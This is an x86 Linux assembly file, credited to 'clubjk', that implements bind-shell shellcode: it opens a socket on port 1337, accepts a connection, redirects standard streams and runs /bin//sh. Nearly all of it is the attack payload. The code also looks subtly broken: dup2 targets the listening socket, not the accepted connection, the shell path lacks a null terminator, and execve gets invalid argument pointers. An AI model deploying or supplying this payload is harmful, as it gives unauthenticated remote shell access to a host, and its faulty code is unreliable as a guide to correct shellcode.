; bind shell 
; Author: clubjk

global _start

section .text

_start:

	;Create a socket with sys_socket
	
	xor eax, eax    ;zeroize the eax
	xor ebx, ebx    ;zeroize the ebx
	
	mov eax, 0x66   ;put socketcall syscall value in eax; 102 in decimal

	mov ebx, 0x1    ;put sys_socket syscall value in ebx; 1 in decimal

	xor esi, esi    ;zeroize the esi, it will be convenient when we need a 0x0 value
	push esi        ;put 0x00000000 in stack, using esi since it is currently zeroized
	push ebx        ;put 0x00000001 in stack, using ebx since we set it to 0x1
	push 0x2        ;put 0x00000002 in stack, using immediate value of 0x2

	mov ecx, esp    ;pass memory location of esp (start of the stack) to ecx

	int 0x80        ;calling system call 102 with the params in eax,ebx, and ecx


	;Bind socket to an address/port via sys_bind

	mov edi, eax	;put the return value from previous syscall (sockfd) in esi for use
	xor eax, eax    ;zeroize the eax
        xor ebx, ebx    ;zeroize the ebx
	xor ecx, ecx

	mov eax, 0x66   ;put socketcall syscall value in eax; 102 in decimal
	mov ebx, 0x2	;put sys_bind syscall value in ebx, 2 in decimal

	push dword 0x00000000
	push word 0x3905 ;port 1337 in hex (0x395), then put in little endian 0x3905
	push word bx
	mov ecx, esp

	push 0x10      ;addrlen=16
	push ecx       ;struct sockaddr pointer
	push edi       ;sockfd
	
	mov ecx, esp   ;save pointer to bind()args

	int 0x80

	;Set up listen system call via sys_listen

	xor ebx, ebx
	mov eax, 0x66
	mov ebx, 0x4

	push esi
	push edi
	
	mov ecx, esp

	int 0x80

	;Accept a new connection with sys_accept

	mov al, 0x66
	inc ebx
	push esi
	push esi
	push edi

	mov ecx, esp

	int 0x80	;invokes sys call

	;Redirect standard input (stdin), (stdout), (stderr) (via dup2 syscall)

	xor eax, eax
	mov al, 0x3f
	mov ebx, edi
	xor ecx, ecx
	int 0x80

	mov al, 0x3f
	inc ecx
	int 0x80

	mov al, 0x3f
	inc ecx
	int 0x80

	;Execute a shell (via execve syscall)

	mov al, 0x0b
	push 0x68732f2f
	push 0x6e69622f
	mov ebx, esp
	inc ecx
	mov edx, ecx

	int 0x80




				 
